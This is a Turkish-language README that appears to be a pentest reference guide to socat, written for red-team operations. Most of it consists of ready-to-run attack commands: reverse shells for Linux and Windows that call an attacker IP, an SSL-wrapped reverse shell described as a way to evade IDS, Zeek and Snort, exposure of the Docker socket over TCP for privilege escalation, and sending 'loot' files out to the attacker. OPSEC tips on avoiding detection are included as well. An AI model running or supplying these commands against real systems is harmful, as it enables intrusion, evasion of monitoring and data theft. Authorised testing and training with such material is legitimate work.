# 🔄 Socat - Kapsamlı Başvuru Kılavuzu

[🇬🇧 English Version](../README.md)

```
  ███████╗ ██████╗  ██████╗ █████╗ ████████╗
  ██╔════╝██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝
  ███████╗██║   ██║██║     ███████║   ██║   
  ╚════██║██║   ██║██║     ██╔══██║   ██║   
  ███████║╚██████╔╝╚██████╗██║  ██║   ██║   
  ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝   ╚═╝   
       Çift Yönlü Veri Aktarımı ve Tam Etkileşimli TTY Kabukları İçin Çok Amaçlı Ağ Rölesi
```

<p align="center">
  <img src="https://img.shields.io/badge/Socat-SOcket_CAT-blue?style=for-the-badge" alt="Socat">
  <img src="https://img.shields.io/badge/Kategori-Sömürü_&_Kabuklar-orange?style=for-the-badge" alt="Sömürü & Kabuklar">
  <img src="https://img.shields.io/badge/Protokoller-TCP_UDP_SSL_UNIX-green?style=for-the-badge" alt="Protokoller">
  <img src="https://img.shields.io/badge/Lisans-GPLv2-red?style=for-the-badge" alt="Lisans GPLv2">
</p>

<p align="center">
  <b>🌐 Dosyalar, borular, aygıtlar, ağ soketleri ve SSL tünelleri arasında çift yönlü bayt akışları kurma ve aktarma aracı</b>
</p>

---

## 📋 İçindekiler

- [Genel Bakış & Socat Mimarisi](#-genel-bakış--socat-mimarisi)
- [Socat vs Netcat Karşılaştırması](#-socat-vs-netcat-karşılaştırması)
- [Kurulum](#-kurulum)
- [Tam Etkileşimli TTY Ters Kabukları](#-tam-etkileşimli-tty-ters-kabukları)
  - [Saldırgan Dinleyicisi (RAW TTY)](#saldırgan-dinleyicisi-raw-tty)
  - [Hedef Kurban Komutu (Pty Başlatma)](#hedef-kurban-komutu-pty-başlatma)
  - [Windows Hedefinde Ters Kabuk](#windows-hedefinde-ters-kabuk)
- [SSL/TLS ile Uçtan Uca Şifreli Ters Kabuklar](#-ssltls-ile-uçtan-uca-şifreli-ters-kabuklar)
  - [Geçici Sertifika Üretimi](#geçici-sertifika-üretimi)
  - [Şifreli Dinleyici ve Bağlantı Kurulumu](#şifreli-dinleyici-ve-bağlantı-kurulumu)
- [Port Yönlendirme & Ağ Rölesi (Relay)](#-port-yönlendirme--ağ-rölesi-relay)
  - [Yerel Port Yönlendirme](#yerel-port-yönlendirme)
  - [Çoklu İstemci Destekli Dinleyici (`fork`)](#çoklu-istemci-destekli-dinleyici-fork)
  - [UNIX Soketini TCP Portuna Açma (Docker Tünelleme)](#unix-soketini-tcp-portuna-açma-docker-tünelleme)
- [Socat ile Dosya Aktarımı](#-socat-ile-dosya-aktarımı)
- [Hızlı Referans Tablosu](#-hızlı-referans-tablosu)
- [Savunma Açısından Değerlendirme & OPSEC](#-savunma-açısından-değerlendirme--opsec)
- [Yasal Uyarı](#-yasal-uyarı)

---

## 🎯 Genel Bakış & Socat Mimarisi

**Socat** (SOcket CAT), bağımsız iki yönlü bayt akışı kurarak aralarında veri transferi gerçekleştiren son derece güçlü bir komut satırı aracıdır. Akışlar dosyalar, borular, TCP/UDP soketleri, SSL tünelleri, SOCKS proxy'leri ve UNIX domain soketleri gibi onlarca farklı adres tipinden oluşturulabildiği için Socat sıklıkla **"Netcat'in steroid almış hali"** olarak tanımlanır.

Sızma testlerinde ve Red Team operasyonlarında Socat iki temel süper gücü ile öne çıkar:
1. **Anında Tam Etkileşimli TTY Kabuğu:** Python pty betiklerine veya `stty raw -echo` komutlarına gerek kalmadan, doğrudan hedefte gerçek bir sözde uçbirim (`pty`) tahsis ederek yön tuşları, sekme tamamlama ve Ctrl+C yakalama kabiliyeti sunar.
2. **Şifreli SSL/TLS Tünelleri:** Düz metin giden ters kabuk trafiğini SSL ile şifreleyerek IDS/IPS ve ağ izleme sistemlerini atlatır.

---

## ⚖️ Socat vs Netcat Karşılaştırması

| Özellik | Netcat (`nc`) | Nmap `ncat` | Socat (`socat`) |
|---------|---------------|-------------|-----------------|
| **Doğal PTY Kabuk Başlatma** | ❌ Yok | ❌ Yok | ✅ Doğal Var (`pty,stderr,setsid`) |
| **SSL / TLS Şifreleme** | ❌ Yok | ✅ Var (`--ssl`) | ✅ Doğal Var (`OPENSSL-LISTEN`, `OPENSSL`) |
| **Çoklu İstemci Rölesi (Fork)** | ❌ Yok | ❌ Yok | ✅ Doğal Var (`fork,reuseaddr`) |
| **UNIX Domain Soket Desteği** | ❌ Yok | ✅ Sınırlı | ✅ Tam Destek (`UNIX-LISTEN`, `UNIX-CLIENT`) |
| **İkili Dosya Boyutu** | Çok Küçük (~40 KB) | Orta (~500 KB) | Orta (~400 KB bağımsız derleme) |
| **Sözdizimi Mantığı** | Basit bayraklar (`-lvnp`) | Bayrak tabanlı (`-lvnp`) | Akış sözdizimi (`<tip>:<argümanlar>`) |

---

## 📥 Kurulum

```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y socat

# Arch Linux
sudo pacman -S socat

# RedHat / CentOS / Fedora
sudo dnf install -y socat
```

---

## 💀 Tam Etkileşimli TTY Ters Kabukları

Standart Netcat ile yakalanan kabuklar ilkel (dumb shell) olduğu için sekme tamamlama çalışmaz, yön tuşları kaçış karakterleri basar ve Ctrl+C oturumu öldürür. Socat bu sorunu kökten çözer.

### Saldırgan Dinleyicisi (RAW TTY)

```bash
# 4444 portunu dinle ve standart girdiyi yerel ham uçbirime bağla
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

> [!NOTE]
> `file:`tty`,raw,echo=0` yerel terminalinizi ham (raw) moda alır ve yerel yankılamayı kapatır. Bağlantı beklenmedik şekilde kesilirse ve terminaliniz tuşlara tepki vermezse `reset` yazıp Enter'a basın.

### Hedef Kurban Komutu (Pty Başlatma)

```bash
# Hedef sistemde tam etkileşimli PTY kabuğu başlatma
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444
```

#### Parametrelerin Anlamları:
- `pty`: Hedef makinede gerçek bir sözde uçbirim (pseudo-terminal) tahsis eder.
- `stderr`: Standart hata çıktılarını sokete yönlendirir.
- `setsid`: Komutu yeni bir oturum grubu altında çalıştırarak ana süreç kapansa bile oturumun canlı kalmasını sağlar.
- `sigint`: Ctrl+C gibi kesme sinyallerini oturumu sonlandırmak yerine doğrudan hedefteki komuta iletir.
- `sane`: Uçbirim ayarlarını standart varsayılanlara sıfırlar.

### Windows Hedefinde Ters Kabuk

```bash
# Saldırgan tarafı dinleyicisi
socat -d -d TCP-LISTEN:4444 STDOUT

# Windows hedef makineden bağlantı
socat TCP:10.10.14.5:4444 EXEC:cmd.exe
```

---

## 🔐 SSL/TLS ile Uçtan Uca Şifreli Ters Kabuklar

Ağ Güvenliği İzleme (NSM), Zeek ve Snort sistemlerinin ters kabuk komutlarınızı görmesini engellemek için trafiği geçici bir SSL/TLS sertifikasıyla şifreleyin.

### Geçici Sertifika Üretimi

```bash
# 1. Saldırgan sistemde özel anahtar ve kendinden imzalı sertifika oluşturma
openssl req -newkey rsa:2048 -nodes -keyout /tmp/socat.key -x509 -days 365 -out /tmp/socat.crt -subj "/CN=corp-update.local"

# 2. Anahtar ve sertifikayı tek bir PEM dosyasında birleştirme
cat /tmp/socat.key /tmp/socat.crt > /tmp/socat.pem
```

### Şifreli Dinleyici ve Bağlantı Kurulumu

```bash
# 1. Saldırgan SSL şifreli dinleyiciyi başlatır
socat file:`tty`,raw,echo=0 OPENSSL-LISTEN:4443,cert=/tmp/socat.pem,verify=0

# 2. Hedef kurban sistem SSL üzerinden bağlanır
socat OPENSSL:10.10.14.5:4443,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane
```

---

## 🔀 Port Yönlendirme & Ağ Rölesi (Relay)

Socat, gelen bağlantıları doğrudan başka bir ağ arayüzüne veya uzak hedefe köprüleyebilir.

### Yerel Port Yönlendirme

```bash
# 8080 portuna gelen istekleri iç ağdaki 192.168.1.50:3306 MySQL sunucusuna yönlendirme
socat TCP-LISTEN:8080,fork TCP:192.168.1.50:3306
```

### Çoklu İstemci Destekli Dinleyici (`fork`)

`fork` parametresi, her yeni bağlantı için bir alt süreç (child process) çatallayarak ana dinleyicinin kesintisiz çalışmasını sağlar:

```bash
# Çoklu istemci HTTP rölesi
socat TCP-LISTEN:80,fork,reuseaddr TCP:10.10.10.200:80
```

### UNIX Soketini TCP Portuna Açma (Docker Tünelleme)

Yetki yükseltme veya pivotlama senaryolarında yerel Docker soketini (`/var/run/docker.sock`) ağ üzerinden erişilebilir kılmak için:

```bash
# Docker UNIX soketini TCP 2375 portuna yönlendirme
socat TCP-LISTEN:2375,reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock

# Saldırgan makinesinden uzaktaki Docker'ı yönetme
docker -H tcp://10.10.10.50:2375 ps
```

---

## 📁 Socat ile Dosya Aktarımı

```bash
# 1. Saldırgan tarafında alıcı dinleyiciyi açma
socat -u TCP-LISTEN:9001,reuseaddr OPEN:loot.tar.gz,creat

# 2. Hedef sistemde dosyayı saldırgana gönderme
socat -u OPEN:loot.tar.gz TCP:10.10.14.5:9001
```

*(Buradaki `-u` bayrağı tek yönlü akışı ifade eder).*

---

## ⚡ Hızlı Referans Tablosu

| Amaç | Komut |
|------|-------|
| **Etkileşimli TTY Dinleyicisi** | `socat file:\`tty\`,raw,echo=0 tcp-listen:<PORT>` |
| **Etkileşimli TTY Ters Kabuk** | `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>` |
| **Şifreli SSL Dinleyicisi** | `socat file:\`tty\`,raw,echo=0 OPENSSL-LISTEN:<PORT>,cert=<PEM>,verify=0` |
| **Şifreli SSL Ters Kabuk** | `socat OPENSSL:<IP>:<PORT>,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane` |
| **Port Yönlendirme (Röle)** | `socat TCP-LISTEN:<LPORT>,fork,reuseaddr TCP:<RHOST>:<RPORT>` |
| **UNIX Soketini Dışa Açma** | `socat TCP-LISTEN:<PORT>,fork UNIX-CLIENT:<SOKET_YOLU>` |
| **Dosya Alma (Dinleyici)** | `socat -u TCP-LISTEN:<PORT> OPEN:<DOSYA>,creat` |
| **Dosya Gönderme (İstemci)** | `socat -u OPEN:<DOSYA> TCP:<IP>:<PORT>` |

---

## 🛡️ Savunma Açısından Değerlendirme & OPSEC

1. **Ağ Şifrelemesi:** Düz metin TCP ters kabukları IDS/IPS sistemlerine kolayca takılır. Gerçek operasyonlarda mutlaka `OPENSSL-LISTEN` ve `OPENSSL` kullanılmalıdır.
2. **Süreç İzleme:** EDR ve Sysmon araçları komut satırında `pty,stderr,setsid` parametrelerini tespit ettiğinde bunu anında ters kabuk şüphesi olarak raporlar.
3. **Statik Derleme:** Hedef sisteme aktarırken harici kütüphane bağımlılığı olmaması için statik derlenmiş (statically linked) tekil socat ikilileri tercih edilmelidir.

---

## ⚠️ Yasal Uyarı

> [!CAUTION]
> Bu kılavuz yalnızca yetkili sızma testleri, siber güvenlik eğitimleri ve sistem yönetimi amacıyla hazırlanmıştır. İzin alınmaksızın sistemlere sızmak ve port yönlendirmeleri yapmak bilişim suçudur. Bilgileri yalnızca yasal sınırlar dahilinde kullanınız.